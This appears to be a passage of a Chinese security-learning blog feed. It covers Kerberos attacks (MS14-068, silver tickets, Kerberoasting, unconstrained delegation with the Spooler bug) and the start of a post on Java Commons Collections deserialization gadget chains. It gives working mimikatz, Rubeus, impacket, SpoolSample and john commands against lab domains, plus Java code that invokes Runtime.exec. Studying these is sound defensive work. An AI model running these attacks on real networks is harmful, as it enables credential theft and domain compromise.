加密的TGS票据(<strong>这一步不管用户有没有访问服务的权限，只要TGT正确，就返回TGS票据，这也是kerberoating能利用的原因，任何一个用户，只要hash正确，可以请求域内任何一个服务的TGS票据。</strong></p></li><li><p>用户拿着TGS票据去请求服务，服务使用自己的hash解密TGS票据。如果解密正确，<strong>就拿着PAC去KDC那边询问用户有没有访问权限，域控解密PAC。获取用户的sid，以及所在的组，再判断用户是否有访问服务的权限，有访问权限(有些服务并没有验证PAC这一步，这也是白银票据能成功的前提，因为就算拥有用户hash，可以制作TGS，也不能制作PAC，PAC当然也验证不成功，但是有些服务不去验证PAC，这是白银票据成功的前提）</strong>就允许用户访问。</p></li></ol><p>​    <strong>特别说明的是，PAC对于用户和服务全程都是不可见的。只有KDC能制作和查看PAC。</strong></p><h3 id="PAC安全问题MS14-068"><a href="#PAC安全问题MS14-068" class="headerlink" title="PAC安全问题MS14-068"></a>PAC安全问题MS14-068</h3><ol><li>在KDC机构对PAC进行验证时，对于PAC尾部的签名算法，虽然原理上规定必须是带有Key的签名算法才可以，但微软在实现上，却允许任意签名算法，只要客户端指定任意签名算法，KDC服务器就会使用指定的算法进行签名验证。</li><li>PAC没有被放在TGT中，而是放在了TGS_REQ数据包的其它地方。但可笑的是，KDC在实现上竟然允许这样的构造，也就是说，KDC能够正确解析出没有放在其它地方的PAC信息。</li><li>只要TGS_REQ按照刚才漏洞要求设置，KDC服务器会做出令人吃惊的事情：它不仅会从Authenticator中取出来subkey把PAC信息解密并利用客户端设定的签名算法验证签名，同时将另外的TGT进行解密得到SessionKeya-kdc；</li><li>在验证成功后，把解密的PAC信息的尾部，重新采用自身Server_key和KDC_key生成一个带Key的签名，把SessionKeya-kdc用subkey加密，从而组合成了一个新的TGT返回给Client-A</li></ol><h4 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h4><ol><li><h5 id="kekeo"><a href="#kekeo" class="headerlink" title="kekeo"></a>kekeo</h5></li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-075835.png"                      alt="img"                ></p><ol start="2"><li><h5 id="impacket"><a href="#impacket" class="headerlink" title="impacket"></a>impacket</h5></li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-075824.png"                      alt="img"                ></p><h5 id="3-pykek"><a href="#3-pykek" class="headerlink" title="3. pykek"></a>3. pykek</h5><p>全称是<code>Python Kerberos Exploitation Kit</code></p><p>应该是ms14068漏洞利用，使用的最广泛的一个，一般常用的ms14068.exe，就是由他打包而成的</p><p>先获取sid</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-075917.png"                      alt="img"                ></p><p>拼接成<code>S-1-5-21-866784659-4049716574-3063611777-1104</code></p><p>生成tgt</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-075916.png"                      alt="img"                ></p><p>验证tgt是否具备域管权限</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-075919.png"                      alt="img"                ></p><h3 id="TGS-REQ-amp-TGS-REP引出的问题"><a href="#TGS-REQ-amp-TGS-REP引出的问题" class="headerlink" title="TGS_REQ &amp; TGS_REP引出的问题"></a>TGS_REQ &amp; TGS_REP引出的问题</h3><h4 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h4><p>​    在TGS_REP里面的ticket的encpart是使用服务的hash进行加密的，如果我们拥有服务的hash，就可以给我们自己签发任意用户的TGS票据，这个票据也被称为白银票据。相较于黄金票据，白银票据使用要访问服务的hash，而不是krbtgt的hash，由于生成的是tgs票据，不需要跟域控打交道，但是白银票票据只能访问特定服务。但是要注意的一点是，伪造的白银票据没有带有有效KDC签名的PAC。如果将目标主机配置为验证KDC PAC签名，则银票将不起作用。</p><p>​    此处使用dc的cifs服务做演示。首先需要获得如下信息：</p><ol><li>/domain</li><li>/sid</li><li>/target:目标服务器的域名全称，此处为域控的全称</li><li>/service：目标服务器上面的kerberos服务，此处为cifs</li><li>/rc4：计算机账户的NTLM hash，域控主机的计算机账户</li><li>/user：要伪造的用户名，此处可用silver测试</li></ol><p><code>sekurlsa::logonpasswords</code>导出服务DC$账户的ntlm hash</p><p>[<img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-081221.jpg"                      alt="3.png"                ></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:test.local /sid:S-1-5-21-514356739-3204155868-1239341419 /target:dc.test.local /service:cifs /rc4:9150e40e4ec936a15baf384ca382a3df /user:dc$ /ptt</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-081441.jpg"                      alt="4.png"                ></p><h4 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h4><p>​    在之前Kerberos的TGS_REQ &amp; TGS_REP过程中提到，只要用户提供的票据正确，服务就会返回自身hash加密的tgs票据，那么如果我们有一个域用户，就可以申请服务的tgs票据，本地爆破服务hash得到服务密码，这个过程叫做Kerberoasting。而在域中，服务通过spn来作为唯一标识。</p><h5 id="SPN简介"><a href="#SPN简介" class="headerlink" title="SPN简介"></a>SPN简介</h5><p>​    SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN</p><p>​    SPN分为两种，一种注册在AD上机器帐户(Computers)下，另一种注册在域用户帐户(Users)下</p><p>​    当一个服务的权限为Local System或Network Service，则SPN注册在机器帐户(Computers)下</p><p>​    当一个服务的权限为一个域用户，则SPN注册在域用户帐户(Users)下</p><h5 id="SPN格式"><a href="#SPN格式" class="headerlink" title="SPN格式"></a>SPN格式</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serviceclass/host:port/servicename</span><br></pre></td></tr></table></figure><ol><li>serviceclass可以理解为服务的名称，常见的有www, ldap, SMTP, DNS, HOST等</li><li>host有两种形式，FQDN和NetBIOS名，例如server01.test.com和server01</li><li>如果服务运行在默认端口上，则端口号(port)可以省略</li></ol><p>通过 <code>setspn -A MSSQLSvc/DM.test.local:1433 sqladmin</code> 注册一个名为MSSQLSvc的SPN，将他分配给sqladmin这个域管账户</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-082851.png"                      alt="image-20230425162850624"                ></p><h5 id="SPN查询"><a href="#SPN查询" class="headerlink" title="SPN查询"></a>SPN查询</h5><p>​    spn查询实际上是通过ldap协议查询的，那么当前用户必须是域用户或者是机器账户。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setspn -q */*</span><br><span class="line">setspn -T test.local -q */*</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-083122.png"                      alt="image-20230425163121403"                ></p><p>CN=Users的是域账户注册的SPN，CN=Computers是机器账户。</p><p>​    域内的任意主机都可以查询SPN，任何一个域用户都可以申请TGS票据。而我们爆破的话应该选择域用户进行爆破，因为机器用户的口令无法远程链接。</p><p>那么Kerberoasting思路如下：</p><ol><li>查询SPN寻找在Users下并且是高权限域用户的服务</li><li>请求并导出TGS</li><li>爆破</li></ol><h5 id="kerberoasting"><a href="#kerberoasting" class="headerlink" title="kerberoasting"></a>kerberoasting</h5><p>基本上将服务器上运行的服务映射到它正在运行的帐户，以便它可以执行/接受 kerberos 身份验证。通常，这些服务，如“CIFS”（Windows 共享）在计算机帐户的上下文中运行。</p><p>列出SPN</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-083543.png"                      alt="img"                ></p><p>它还给了我一张票，我可以尝试暴力解密以获取用户的密码：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-083546.png"                      alt="img"                ></p><p>john破解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john GetUserSPNs.out --wordlist=/usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-083547.png"                      alt="img"                ></p><h3 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h3><p>将我的权限给服务账户</p><h4 id="域委派"><a href="#域委派" class="headerlink" title="域委派"></a>域委派</h4><p>​    一句话概况，委派就是将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。<strong>将我的权限给服务账户</strong>。</p><p>​    需要注意的一点是接受委派的用户只能是服务账户或者机器账户</p><ol><li>机器账户:活动目录中的computers组内的计算机，也被称为机器账号。</li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-084427.png"                      alt="image-20230425164426236"                ></p><ol start="2"><li>服务账号：域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来加入域内，比如：SQLServer，MYSQL等，还有就是域用户通过注册SPN也能成为服务账号。</li></ol><h4 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h4><p>在域中如果出现A使用Kerberos身份验证访问域中的服务B，而B再利用A的身份去请求域中的服务C，这个过程就可以理解为委派</p><p>一个经典的例子如图</p><p><a href="https://y4er.com/img/uploads/Kerberos-Unconstrained-Delegation/1.png"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-084150.jpg"                      alt="1.png"                ></a></p><p>jack需要登陆到后台文件服务器，经过Kerberos认证的过程如下：</p><ol><li>jack以Kerberos协议认证登录，将凭证发送给websvc</li><li>websvc使用jack的凭证向KDC发起Kerberos申请TGT。</li><li>KDC检查websvc的委派属性，如果websvc可以委派，则返回可转发的jack的TGT。</li><li>websvc收到可转发TGT之后，使用该TGT向KDC申请可以访问后台文件服务器的TGS票据。</li><li>KDC检查websvc的委派属性，如果可以委派，并且权限允许，那么返回jack访问服务的TGS票据。</li><li>websvc使用jack的服务TGS票据请求后台文件服务器。</li></ol><p>一个微软的官方流程图：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-090253.png"                      alt="image-20230425170252670"                ></p><p>具体说明：</p><p>WIN2016 域控 hostname：DC ip：10.150.127.166</p><p>win2016 域机器 hostname：WEB ip：10.150.127.168</p><p>域用户 many asd123!</p><h5 id="设置非约束性委派"><a href="#设置非约束性委派" class="headerlink" title="设置非约束性委派"></a>设置非约束性委派</h5><h6 id="机器账户的非约束性委派设置"><a href="#机器账户的非约束性委派设置" class="headerlink" title="机器账户的非约束性委派设置"></a>机器账户的非约束性委派设置</h6><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-091117.png"                      alt="image-20230425171117546"                ></p><h6 id="服务账户的非约束委派设置"><a href="#服务账户的非约束委派设置" class="headerlink" title="服务账户的非约束委派设置"></a>服务账户的非约束委派设置</h6><p>many是普通域用户 默认是没有委派设置的</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-092108.png"                      alt="image-20230425172107303"                ></p><p>给域用户注册SPN</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -U -A priv/test many</span><br></pre></td></tr></table></figure><p>在域控上执行</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-092220.png"                      alt="image-20230425172219977"                ></p><p>然后查看many用户</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-093920.png"                      alt="image-20230425173920266"                ></p><p>已经有了委派属性然后设置为非约束委派</p><h6 id="查询域内设置了非约束委派的服务账户"><a href="#查询域内设置了非约束委派的服务账户" class="headerlink" title="查询域内设置了非约束委派的服务账户"></a>查询域内设置了非约束委派的服务账户</h6><p>在WEB上执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=haishi,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-094703.png"                      alt="image-20230425174701359"                ></p><h6 id="查询域内设置了非约束委派的机器账户"><a href="#查询域内设置了非约束委派的机器账户" class="headerlink" title="查询域内设置了非约束委派的机器账户"></a>查询域内设置了非约束委派的机器账户</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=haishi,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-094924.png"                      alt="image-20230425174923466"                ></p><p><strong>域内域控机器账户默认设置了非约束委派</strong></p><p>adfind和ldapsearch都可以查询。</p><h4 id="非约束委派利用方式1"><a href="#非约束委派利用方式1" class="headerlink" title="非约束委派利用方式1"></a>非约束委派利用方式1</h4><p>环境：WEB可委派，DC是域控。</p><p>先查看WEB上的票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot; exit</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-101700.png"                      alt="image-20230425181659489"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-101740.png"                      alt="image-20230425181740021"                ></p><p>在DC上通过WinRM访问Web</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-100822.png"                      alt="image-20230425180822074"                ></p><p>此时DM上已经缓存了从DC登录过来的域管的ticket，mimikatz导出</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-101806.png"                      alt="image-20230425181804566"                ></p><p>导入票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptt [0;36eb98]-2-0-60a10000-Administrator@krbtgt-HAISHI.COM.kirbi&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-100939.png"                      alt="image-20230425180938440"                ></p><p>再次访问</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-101911.png"                      alt="image-20230425181910605"                ></p><p>清除缓存</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-101942.png"                      alt="image-20230425181942282"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-101957.png"                      alt="image-20230425181955658"                ></p><h4 id="非约束委派利用方式2（Spooler打印机服务）"><a href="#非约束委派利用方式2（Spooler打印机服务）" class="headerlink" title="非约束委派利用方式2（Spooler打印机服务）"></a>非约束委派利用方式2（Spooler打印机服务）</h4><p>​    利用Windows打印系统远程协议（MS-RPRN）中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用MS-RPRN <code>RpcRemoteFindFirstPrinterChangeNotification(Ex)</code>方法强制任何运行了Spooler服务的计算机以通过Kerberos或NTLM对攻击者选择的目标进行身份验证。</p><p>工具：<a class="link"   href="https://github.com/leechristensen/SpoolSample" >https://github.com/leechristensen/SpoolSample<i class="fas fa-external-link-alt"></i></a></p><p>​    需要以域用户运行SpoolSample，需要开启Print Spooler服务，该服务默认自启动。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-164517.png"                      alt="image-20230426004516253"                ></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SpoolSample.exe DC DM</span><br></pre></td></tr></table></figure><p>使DC强制访问DM认证，同时使用rubeus监听来自DC的4624登录日志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:1 /filteruser:dc$</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-165432.png"                      alt="image-20230426005431373"                ></p><p>使用Rubues导入base64的ticket</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe ptt /ticket:base64</span><br></pre></td></tr></table></figure><p>此时导出的ticket就有DC的TGT了</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-165617.png"                      alt="image-20230426005617211"                ></p><p>用mimikatz ptt就完事</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-165645.png"                      alt="image-20230426005645119"                ></p><h4 id="约束性委派"><a href="#约束性委派" class="headerlink" title="约束性委派"></a>约束性委派</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;​    网络上关于Windows认证方式的学习的文章，在此为了对原理理解更加透彻，现在跟着网上大佬们的资料学习，供以后参考使用。&lt;/p&gt;
</summary>
      
    
    
    
    <category term="Windows认证" scheme="http://example.com/categories/Windows%E8%AE%A4%E8%AF%81/"/>
    
    
    <category term="Windows" scheme="http://example.com/tags/Windows/"/>
    
    <category term="本地认证" scheme="http://example.com/tags/%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81/"/>
    
    <category term="网络认证" scheme="http://example.com/tags/%E7%BD%91%E7%BB%9C%E8%AE%A4%E8%AF%81/"/>
    
    <category term="Kerberos" scheme="http://example.com/tags/Kerberos/"/>
    
    <category term="Windows Access Token" scheme="http://example.com/tags/Windows-Access-Token/"/>
    
  </entry>
  
  <entry>
    <title>Java安全从零到一(8)-Commons Collections POP Gadget Chains简介</title>
    <link href="http://example.com/2023/02/18/Java%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80-8-Commons-Collections-POP-Gadget-Chains%E7%AE%80%E4%BB%8B/"/>
    <id>http://example.com/2023/02/18/Java%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80-8-Commons-Collections-POP-Gadget-Chains%E7%AE%80%E4%BB%8B/</id>
    <published>2023-02-18T02:48:53.000Z</published>
    <updated>2023-04-23T17:05:57.591Z</updated>
    
    <content type="html"><![CDATA[<h2 id="写在之前"><a href="#写在之前" class="headerlink" title="写在之前"></a>写在之前</h2><p>​    其实对于基础，真的太多太多了，需要学习的也很多，如果真的可以坚持全部做下来，其实对Java语言基础理解应该是足够的。而本人在写了前面的Java基础的博客后，确实对代码的理解更加通顺了一些。但确实过程很漫长，光第二篇基础就写了5W多，加上需要对代码的理解，所以可以把第二篇当作知识库，需要的时候查阅即可。当然，全部读懂肯定更好。本篇会从CC链中的TransformedMap和LazyMap两条链子入手，希望本人可以搞懂，如有不正确的也欢迎指出🙏</p><h2 id="环境与流程相关"><a href="#环境与流程相关" class="headerlink" title="环境与流程相关"></a>环境与流程相关</h2><p>​    复现环境是 IntelliJ IDEA + jdk1.7.080 + Apache Commons Collections 3.1</p><ol><li><p>首先我们需要一个 Apache Commons Collections » 3.1 的 Jar 包 , 可以从  MVNRepository 上获取到它.</p></li><li><p>然后打开 IntelliJ IDEA , 创建一个普通的 Java 项目 , 注意 JDK 版本需要为 1.7</p></li><li><p>导入之前下载的 commons-collections-3.1.jar 包 ,</p></li></ol><h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><h3 id="org-apache-commons-collections-functors-InvokerTransformer-class"><a href="#org-apache-commons-collections-functors-InvokerTransformer-class" class="headerlink" title="org/apache/commons/collections/functors/InvokerTransformer.class"></a><strong>org/apache/commons/collections/functors/InvokerTransformer.class</strong></h3><ol><li><strong>InvokerTransformer.class</strong> 类中的 <strong>Transformer()</strong> 方法中存在一组反射调用 , 这组反射调用是漏洞产生的根源.</li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-18-071243.png"                      alt="image-20230418151243061"                ></p><p>​    这是我们以前的例子，我们拿出来放在这里对比</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> method.invoke(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span>(Process) exec.invoke(obj,<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-18-073821.png"                      alt="image-20230418153820807"                ></p><p>​    对比一下 , 只要我们能控制 <strong>input</strong> , <strong>this.iMethodName</strong> , <strong>this.iParamTypes</strong> , <strong>this.iArgs</strong> 四个参数 , 那么就可以通过这组反射调用执行任意代码 !</p><ol start="2"><li>那么这些参数是否可控呢 ? 回顾 <strong>InvokerTransformer.class</strong> 类的构造函数 , 可以发现 <strong>this.iMethodName</strong> , <strong>this.iParamTypes</strong> , <strong>this.iArgs</strong> 三个参数都是直接可控的 , 我们可以直接传入参数值 , 而 <strong>input</strong> 参数是 <strong>transform()</strong> 函数调用方传入的 , 同样可控 .</li></ol><p>​    下图为InvokerTransformer的构造方法，可以发现iMethodName, iparamTypes, iArgs三个参数均直接可控.</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-18-074636.png"                      alt="image-20230418154636059"                ></p><p>​    而input参数是transform()参数传入的，同样可以控制</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-18-074853.png"                      alt="image-20230418154853175"                ></p><ol start="3"><li>那么基于这些信息，我们写一个最简单的利用方式</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">transformer利用链，仅本地</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">easyPoc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>&#125;);</span><br><span class="line">        t1.transform(Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-18-075849.png"                      alt="image-20230418155849410"                ></p><ol start="3"><li>虽然可以成功执行命令 , 但是这种攻击方式肯定是没有意义的 , 我们构造代码是为了在远端服务上执行 , 而并非在本地服务器上执行 . 远程服务器上肯定不会出现像 <strong>t1.transform(Runtime.getRuntime());</strong> 这样的代码 . 所以我们必须对上述代码做优化 , 减少反序列化后的操作 .</li></ol><p>​    优化代码的第一步就是消除transform() 方法的参数限制 : Runtime.getRuntime().</p><h3 id="org-apache-commons-collections-functors-ChainedTransformer-class"><a href="#org-apache-commons-collections-functors-ChainedTransformer-class" class="headerlink" title="org/apache/commons/collections/functors/ChainedTransformer.class"></a><strong>org/apache/commons/collections/functors/ChainedTransformer.class</strong></h3><ol><li><p>消除上述限制的最好方法就是通过 Java 反射机制来构建 <strong>java.lang.Runtime.getRuntime().exec()</strong> 方法调用链 . 由于 <strong>Runtime.class</strong> 构造函数的特殊性 , 我们在编写 Java 反射代码时至少要调用 <strong>getMethod()</strong> , <strong>getRuntime()</strong> , <strong>exec()</strong> , <strong>invoke()</strong> 四个方法 . 因此 , 一组反射是完全不够用的 , 我们必须要找到一条链 , 来拼接多组反射 , 从而实现命令执行 .</p><p>ChainedTransformer.transform() 方法恰好符合这个要求.</p></li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-18-081148.png"                      alt="image-20230418161148153"                ></p><p>​    <strong>ChainedTransformer</strong> 类的构造函数返回一个 <strong>Transformer[]</strong> 类型的数组<strong>this.iTransformers</strong> . 该类的 <strong>transform()</strong> 方法会循环获取 <strong>this.iTransformers</strong> 数组中的每一项 , 调用它的 <strong>transform()</strong> 方法 , 并将返回结果作为下次循环调用的参数 .</p><p>​    <strong>请注意，这里的transform()方法非常重要，后续transformer利用链基本上都围绕它展开，这里的意思是，每次都从iTransformers[ ]数组中拿一个，假定此处为iTransformers[1]，执行transform(a)，transform返回的是一个a.iTransformers[1]( )，然后继续拿这个对象再去从iTransformers[ ]数组中取出第二个，以此循环</strong></p><p>​    <strong>举个例子，我们这里想要的是Runtime.getRuntime.exec( )</strong></p><p>​    所以 , 我们可以编写多个 <strong>InvokerTransformer</strong> 实例对象 , 分别获取 <strong>getRuntime()</strong> , <strong>invoke()</strong> , <strong>exec()</strong> 方法 , 然后将这些实例对象添加到 